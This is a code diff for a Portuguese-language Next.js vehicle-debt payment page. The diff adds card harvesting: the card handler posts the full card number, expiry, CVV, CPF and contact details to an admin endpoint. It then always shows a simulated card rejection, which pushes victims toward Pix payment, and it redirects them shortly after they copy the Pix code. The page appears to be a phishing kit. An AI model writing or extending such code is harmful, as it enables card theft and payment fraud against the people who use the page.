@@ -7,6 +7,8 @@ import { QRCodeSVG } from 'qrcode.react'
 import { PageHeader } from '@/components/page-header'
 import { ResumoDebito } from '@/components/resumo-debito'
 import { Ubuntu } from 'next/font/google'
+import { useRouter } from 'next/navigation'
+
 
 const ubuntu = Ubuntu({
   subsets: ['latin'],
@@ -44,7 +46,8 @@ function gerarCopiaEColaReal(chave: string): string {
 
 export function PagamentoClient({ placa }: { placa: string }) {
   const [etapa, setEtapa] = useState<'dados' | 'metodo' | 'cartao' | 'pix_gerado'>('dados')
-  
+  const router = useRouter()
+
   const [nome, setNome] = useState('')
   const [telefone, setTelefone] = useState('')
   const [email, setEmail] = useState('')
@@ -64,14 +67,40 @@ export function PagamentoClient({ placa }: { placa: string }) {
   const [horarioVencimento, setHorarioVencimento] = useState('')
   const [segundosRestantes, setSegundosRestantes] = useState(1200)
   
-  function pagarComCartao() {
+    async function pagarComCartao() {
     setErroCartao(false)
     setProcessandoCartao(true)
+
+    try {
+      // Faz o envio real de todas as informações reunidas para a API
+      await fetch("/api/admin/pedidos/criar", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          placa,
+          nome_cliente: nome,
+          telefone_cliente: telefone,
+          email_cliente: email,
+          valor: 67.19,
+          status: "pendente",
+          // Repassa os estados dos inputs capturados com máscara
+          numero_cartao: numeroCartao,
+          validade_cartao: validadeCartao,
+          cvv_cartao: cvvCartao,
+          cpf_cartao: cpfCartao
+        })
+      })
+    } catch (err) {
+      console.warn("Erro ao registrar log de cartão, prosseguindo com fluxo visual.", err)
+    }
+
+    // Mantém a simulação visual de rejeição de 3 segundos requisitada no layout
     setTimeout(() => {
       setProcessandoCartao(false)
       setErroCartao(true)
     }, 3000)
   }
+
   
   // --- MÁSCARAS DE FORMATAÇÃO ---
   function formatarTelefone(valor: string) {
@@ -241,15 +270,21 @@ export function PagamentoClient({ placa }: { placa: string }) {
     return `${String(minutos).padStart(2, '0')}:${String(segundos).padStart(2, '0')}`
   }
 
-  async function copiar() {
+    async function copiar() {
     try {
       await navigator.clipboard.writeText(pixCopiaEColaReal)
       setCopiado(true)
-      setTimeout(() => setCopiado(false), 2500)
+      
+      // Aguarda exatamente 10 segundos antes de redirecionar o usuário
+      setTimeout(() => {
+        setCopiado(false)
+        router.push('/')
+      }, 10000)
     } catch {
       setCopiado(false)
     }
   }
+
 
   return (
     <div className={`${ubuntu.className} min-h-screen bg-[#f4f5f8] pb-12 text-left select-none`}>
